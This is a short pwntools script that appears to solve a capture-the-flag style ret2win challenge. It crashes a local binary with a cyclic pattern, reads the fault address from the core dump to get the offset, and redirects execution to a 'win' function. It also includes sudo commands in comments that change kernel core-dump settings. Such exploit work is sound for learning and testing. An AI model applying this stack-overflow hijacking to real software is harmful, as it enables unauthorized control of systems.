#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template a.out
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('a.out')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# args.GDB = True
context.terminal = ["st", "-e", "bash", "-c"]
gdbscript = '''
tbreak vulnerable
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled



io = start()
io.send(cyclic(200, n=8))
io.shutdown()
io.wait()

# echo 1 | sudo tee /proc/sys/kernel/core_uses_pid
# echo "/tmp/core" | sudo tee /proc/sys/kernel/core_pattern
# echo 0 | sudo tee /proc/sys/kernel/core_uses_pid
core = Coredump("/tmp/core")
offset = cyclic_find(p64(core.fault_addr), n=8)

io = start()
payload = fit({ offset: exe.symbols.win })
io.send(payload)
io.interactive()
